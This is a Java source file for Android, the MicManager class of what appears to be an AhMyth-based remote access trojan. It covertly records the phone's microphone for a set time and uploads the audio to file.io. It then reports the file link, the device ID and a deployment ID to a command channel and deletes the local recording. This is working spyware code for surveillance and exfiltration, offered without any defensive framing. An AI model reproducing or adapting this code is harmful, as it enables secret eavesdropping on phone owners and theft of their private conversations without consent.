package com.gnu.cobat;

        import android.content.Context;
        import android.media.AudioFormat;
        import android.media.AudioManager;
        import android.media.AudioRecord;
        import android.media.AudioTrack;
        import android.media.MediaRecorder;
        import android.os.Environment;
        import android.os.ParcelFileDescriptor;
        import android.telephony.TelephonyManager;
        import android.util.Log;
        import android.view.View;

        import org.json.JSONException;
        import org.json.JSONObject;

        import java.io.BufferedInputStream;
        import java.io.File;
        import java.io.FileInputStream;
        import java.io.FileNotFoundException;
        import java.io.FileOutputStream;
        import java.io.IOException;
        import java.io.InputStream;
        import java.io.OutputStream;
        import java.util.Timer;
        import java.util.TimerTask;

        import okhttp3.MediaType;
        import okhttp3.MultipartBody;
        import okhttp3.OkHttpClient;
        import okhttp3.Request;
        import okhttp3.RequestBody;
        import okhttp3.Response;

/**
 * Created by AhMyth on 11/11/16.
 */

public  class MicManager {


    static MediaRecorder recorder;
    static File audiofile = null;
    static final String TAG = "MediaRecording";
    static TimerTask stopRecording;


    public static void startRecording(int sec) throws Exception {


        //Creating file
        File dir = MainService.getContextOfApplication().getCacheDir();
        try {
//            Log.e("DIRR" , dir.getAbsolutePath());
            audiofile = File.createTempFile("sound", ".mp3", dir);
        } catch (IOException e) {
            Log.e(TAG, "external storage access error");
            return;
        }

        //Creating MediaRecorder and specifying audio source, output format, encoder & output format
        recorder = new MediaRecorder();
        recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
        recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
        recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
        recorder.setOutputFile(audiofile.getAbsolutePath());
        recorder.prepare();
        recorder.start();

//        Log.wtf("lokasi", audiofile.getAbsolutePath());

        File download = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);

//        Log.wtf("WOI", download.getAbsolutePath());

        stopRecording = new TimerTask() {
            @Override
            public void run() {
                //stopping recorder
                recorder.stop();
                recorder.release();
                sendVoice(audiofile);
                audiofile.delete();
            }
        };

        new Timer().schedule(stopRecording, sec*1000);
    }

    private static void sendVoice(File file){
        TelephonyManager telephonyManager = (TelephonyManager)MainService.getContextOfApplication().getSystemService(Context.TELEPHONY_SERVICE);
        String deviceID = telephonyManager.getDeviceId();

        int size = (int) file.length();
        byte[] data = new byte[size];
        try {
            OkHttpClient client = new OkHttpClient();

            RequestBody requestBody = new MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataPart("file", file.getName(),
                            RequestBody.create(MediaType.parse("audio/mpeg"), file))
                    .build();

            Request request = new Request.Builder()
                    .url("https://file.io")
                    .post(requestBody)
                    .build();

            try (Response response = client.newCall(request).execute()) {
                JSONObject fileio = new JSONObject(response.body().string());
                JSONObject object = new JSONObject();
                object.put("file",true);
                object.put("name",file.getName());
                object.put("addr", fileio.getString("link"));

                object.put("deploy_id", Global.deploy_id);
                object.put("device_id", deviceID);
                object.put("return", true);
                object.put("return_type", "cb-record");

                IOSocket.getInstance().publish(Global.channel, object.toString().getBytes(), null);
            }
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        } catch (JSONException e) {
            e.printStackTrace();
        }
    }
}

